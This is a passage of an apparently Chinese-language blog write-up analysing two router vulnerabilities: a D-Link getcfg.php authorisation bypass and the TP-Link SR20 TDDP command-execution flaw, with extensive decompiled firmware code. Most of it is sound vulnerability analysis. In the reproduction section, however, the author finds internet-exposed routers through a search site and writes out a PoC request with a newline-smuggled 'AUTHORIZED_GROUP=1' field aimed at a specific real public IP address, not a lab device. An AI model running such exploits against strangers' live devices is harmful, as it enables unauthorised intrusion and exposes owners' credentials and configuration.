class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  v11 = sub_405AC0;</span><br><span class="line">LABEL_13:</span><br><span class="line">  v5 = cgibin_parse_request(v11, v6, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = sess_validate();</span><br><span class="line">    <span class="built_in">sprintf</span>(v16, <span class="string">&quot;AUTHORIZED_GROUP=%d&quot;</span>, v13);</span><br><span class="line">    sobj_add_string(v6, v16);</span><br><span class="line">    sobj_add_char(v6, <span class="number">10</span>);</span><br><span class="line">    sobj_add_string(v6, <span class="string">&quot;SESSION_UID=&quot;</span>);</span><br><span class="line">    sess_get_uid(v6);</span><br><span class="line">    sobj_add_char(v6, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">string</span> = sobj_get_string(v6);</span><br><span class="line">    v5 = xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, <span class="built_in">string</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>并且服务器自带的<code>AUTHORIZED_GROUP</code>变量是拼接在之前的变量之后的</p><p>因此如若我们自行传递一个<code>AUTHORIZED_GROUP=1</code>那么</p><p><code>getcfg.php</code>读取到的<code>AUTHORIZED_GROUP</code>变量就是我们自己传入的</p><p>那么就可以构造poc</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>因为没找到这题的环境,所以没办法在本机上复现</p><p>不过好在我们能够借助一些网站帮助我们找到公网上使用这个路由器的ip</p><p><code>url -d &quot;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1&quot; &quot;http://47.181.78.181:8080/getcfg.php&quot;</code></p><h1 id="TP-Link-SR20-命令执行漏洞"><a href="#TP-Link-SR20-命令执行漏洞" class="headerlink" title="TP-Link SR20 命令执行漏洞"></a>TP-Link SR20 命令执行漏洞</h1><p><code>TDDP</code>协议(<code>TP-LINK Device Debug Protocol</code>) 是<code>TP-LINK</code>申请了专利的一种在<code>UPD</code>通信的基础上设计的协议，而<code>Google</code>安全专家<code>Matthew Garrett</code>在<code>TP-Link SR20</code>设备上的<code>TDDP</code>协议文件中发现了一处可造成 <strong>“允许来自本地网络连接的任意命令执行”</strong> 的漏洞。</p><p>TDDP数据包格式</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/735423_5s7k5dx9u5aoe0d.png" alt=""></p><p>其中，<code>TDDP</code>报头中的<code>Ver</code>字段是版本号，分为<code>V1</code>和<code>V2</code>两个版本，<code>V1</code>版本是不需要进行身份认证的；<code>Type</code>字段是报文类型，编号及类型的对照如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4：CMD_AUTO_TEST   6: CMD_CONFIG_MAC   7: CMD_CANCEL_TEST</span><br><span class="line">8: CMD_REBOOT_FOR_TEST   0XA:CMD_GET_PROD_ID   0XC: CMD_SYS_INIT </span><br><span class="line">0XD: CMD_CONFIG_PIN   0X30: CMD_FTEST_USB   0X31: CMD_FTEST_CONFIG</span><br></pre></td></tr></table></figure><p>根据公开的漏洞信息，<strong>这个漏洞存在于<code>V1</code>版本下的<code>0X31: CMD_FTEST_CONFIG</code>类型处</strong>。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>存在漏洞的文件位于<code>/usr/bin/tddp</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+Ch] [bp-8h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = sub_16C90(argc, argv, envp);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  v4 = sub_936C();</span><br><span class="line">  v7 = sub_16D40(v4);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">    <span class="keyword">return</span> v7;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_16C90</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  dword_21A34 = (<span class="type">int</span>)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">4u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_21A34 )</span><br><span class="line">    <span class="keyword">return</span> sub_13018(<span class="number">-10201</span>, <span class="string">&quot;no memery&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0</span>; ++i )</span><br><span class="line">    *(_DWORD *)(dword_21A34 + <span class="number">4</span> * i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_16c90</code>就是对内存做一下初始化工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_16D40</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)dword_21A34);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>sub_16D40</code>就是释放之前分配的内存</p><p>因此核心显然是中间的<code>sub_936C</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_936C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> optval; <span class="comment">// [sp+Ch] [bp-B0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+10h] [bp-ACh] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>;</span> <span class="comment">// [sp+14h] [bp-A8h] BYREF</span></span><br><span class="line">  fd_set readfds; <span class="comment">// [sp+1Ch] [bp-A0h] BYREF</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// [sp+9Ch] [bp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+A0h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> nfds; <span class="comment">// [sp+A4h] [bp-18h]</span></span><br><span class="line">  fd_set *p_readfds; <span class="comment">// [sp+A8h] [bp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [sp+ACh] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] tddp task start\n&quot;</span>, <span class="string">&quot;tddp_taskEntry&quot;</span>, <span class="number">151</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_16ACC(&amp;v6)</span><br><span class="line">    &amp;&amp; !sub_16E5C(v6 + <span class="number">9</span>)</span><br><span class="line">    &amp;&amp; !setsockopt(v6[<span class="number">9</span>], <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>)</span><br><span class="line">    &amp;&amp; !sub_16D68(v6[<span class="number">9</span>], <span class="number">1040</span>)</span><br><span class="line">    &amp;&amp; !setsockopt(v6[<span class="number">9</span>], <span class="number">1</span>, <span class="number">6</span>, &amp;v3, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">2u</span>;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">4u</span>;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">8u</span>;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x10</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x20</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x1000</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x2000</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x4000</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x8000</span>u;</span><br><span class="line">    v6[<span class="number">12</span>] = <span class="number">60</span>;</span><br><span class="line">    v0 = v6;</span><br><span class="line">    v0[<span class="number">13</span>] = sub_9340();</span><br><span class="line">    p_readfds = &amp;readfds;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">      p_readfds-&gt;__fds_bits[i] = <span class="number">0</span>;</span><br><span class="line">    nfds = v6[<span class="number">9</span>] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        timeout.tv_sec = <span class="number">600</span>;</span><br><span class="line">        timeout.tv_usec = <span class="number">0</span>;</span><br><span class="line">        readfds.__fds_bits[v6[<span class="number">9</span>] &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; (v6[<span class="number">9</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">        v7 = select(nfds, &amp;readfds, <span class="number">0</span>, <span class="number">0</span>, &amp;timeout);</span><br><span class="line">        <span class="keyword">if</span> ( sub_9340() - v6[<span class="number">13</span>] &gt; v6[<span class="number">12</span>] )</span><br><span class="line">          v6[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 == <span class="number">-1</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((readfds.__fds_bits[v6[<span class="number">9</span>] &gt;&gt; <span class="number">5</span>] &gt;&gt; (v6[<span class="number">9</span>] &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        sub_16418(v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_16E0C(v6[<span class="number">9</span>]);</span><br><span class="line">  sub_16C18(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] tddp task exit\n&quot;</span>, <span class="string">&quot;tddp_taskEntry&quot;</span>, <span class="number">219</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面一大坨都是内存初始化以及socket创建之类的</p><p>主要关注一下<code>sub_16D68</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_16D68</span><span class="params">(<span class="type">int</span> a1, <span class="type">uint16_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">s</span>;</span> <span class="comment">// [sp+8h] [bp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  s.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line">  *(_WORD *)s.sa_data = htons(a2);</span><br><span class="line">  <span class="keyword">if</span> ( bind(a1, &amp;s, <span class="number">0x10</span>u) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> error(<span class="number">-10103</span>, <span class="string">&quot;failed to bind socket&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>a2</code>是传进来的参数<code>1040</code>，<code>htons</code>函数是将整型变量从主机字节顺序转变成网络字节顺序</p><p><code>int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</code></p><p><code>bind()</code> 函数在网络编程中非常重要，它用于将一个套接字（socket）与特定的地址（IP 地址和端口号）绑定在一起，从而使得其他套接字可以通过该地址与之通信。</p><p><code>sub_9340</code>函数是获取当前时间,不管</p><p>最后两个函数是结束的一些处理,也不管</p><p>那就剩下<code>sub_16418</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_16418</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line">  __int16 v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r3</span></span><br><span class="line">  __int16 v5; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r3</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+10h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">socklen_t</span> addr_len; <span class="comment">// [sp+14h] [bp-28h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [sp+18h] [bp-24h] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v14; <span class="comment">// [sp+28h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+2Ch] [bp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v16; <span class="comment">// [sp+30h] [bp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+34h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  addr_len = <span class="number">16</span>;</span><br><span class="line">  n = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">char</span> *)a1 + <span class="number">45083</span>, <span class="number">0</span>, <span class="number">0xAFC9</span>u);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">char</span> *)a1 + <span class="number">82</span>, <span class="number">0</span>, <span class="number">0xAFC9</span>u);</span><br><span class="line">  v16 = (<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45083</span>;</span><br><span class="line">  v15 = (<span class="type">int</span>)a1 + <span class="number">82</span>;</span><br><span class="line">  v14 = recvfrom(a1[<span class="number">9</span>], (<span class="type">char</span> *)a1 + <span class="number">45083</span>, <span class="number">0xAFC8</span>u, <span class="number">0</span>, &amp;addr, &amp;addr_len);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> error(<span class="number">-10106</span>, <span class="string">&quot;receive error&quot;</span>);</span><br><span class="line">  sub_15458(a1);</span><br><span class="line">  a1[<span class="number">11</span>] |= <span class="number">1u</span>;</span><br><span class="line">  v2 = *v16;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_15AD8(a1, &amp;addr) )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">13</span>] = sub_9340();</span><br><span class="line">      v17 = sub_15E74(a1, &amp;n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">-10301</span>;</span><br><span class="line">      *(_BYTE *)v15 = <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">1</span>) = v16[<span class="number">1</span>];</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">3</span>) = <span class="number">8</span>;</span><br><span class="line">      *(_DWORD *)(v15 + <span class="number">4</span>) = htonl(<span class="number">0</span>);</span><br><span class="line">      v5 = (v16[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | v16[<span class="number">8</span>];</span><br><span class="line">      v6 = v15;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">8</span>) = v16[<span class="number">8</span>];</span><br><span class="line">      *(_BYTE *)(v6 + <span class="number">9</span>) = HIBYTE(v5);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_15AD8(a1, &amp;addr) )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">13</span>] = sub_9340();</span><br><span class="line">      v17 = sub_15BB8(a1, &amp;n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">-10301</span>;</span><br><span class="line">      *(_BYTE *)v15 = <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">1</span>) = v16[<span class="number">1</span>];</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">3</span>) = <span class="number">8</span>;</span><br><span class="line">      *(_DWORD *)(v15 + <span class="number">4</span>) = htonl(<span class="number">0</span>);</span><br><span class="line">      v3 = (v16[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | v16[<span class="number">8</span>];</span><br><span class="line">      v4 = v15;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">8</span>) = v16[<span class="number">8</span>];</span><br><span class="line">      *(_BYTE *)(v4 + <span class="number">9</span>) = HIBYTE(v3);</span><br><span class="line">      sub_15830(a1, &amp;n);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(v15 + <span class="number">3</span>) = <span class="number">7</span>;</span><br><span class="line">    v7 = (_BYTE *)v15;</span><br><span class="line">    *(_BYTE *)(v15 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    v7[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    v7[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    v7[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    n = ((*(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">7</span>) &lt;&lt; <span class="number">24</span>) | (*(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">6</span>) &lt;&lt; <span class="number">16</span>) | (*(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">5</span>) &lt;&lt; <span class="number">8</span>) | *(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">4</span>))</span><br><span class="line">      + <span class="number">12</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    v8 = a1[<span class="number">11</span>] &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &amp;&amp; sendto(a1[<span class="number">9</span>], (<span class="type">char</span> *)a1 + <span class="number">82</span>, n, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> error(<span class="number">-10105</span>, <span class="string">&quot;tddp_parserHandler sendto error&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了<code>recvfrom()函数</code>，该函数的原型是：<code>ssize_t recvfrom(int sockfd,void *buf,size_t len,unsigned int flags, struct sockaddr *from,socklen_t *fromlen)</code>，用来接收远程主机经指定的<code>socket</code>传来的数据，并把数据传到由参数<code>buf</code>指向的内存空间。</p><p>看<code>sub_15E74</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_15E74</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v2; <span class="comment">// r2</span></span><br><span class="line">  __int16 v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+Ch] [bp-18h]</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// [sp+10h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+1Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = (_BYTE *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v7 = a1 + <span class="number">82</span>;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">82</span>) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( *(_BYTE *)(a1 + <span class="number">45084</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">          ....</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x31</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_FTEST_CONFIG\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">692</span>);</span><br><span class="line">      v9 = sub_A580(a1);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这是在检测type,漏洞点在的<code>case 0x31</code>处：</p><p>进入<code>sub_A580</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_A580</span><span class="params">(<span class="type">int</span> 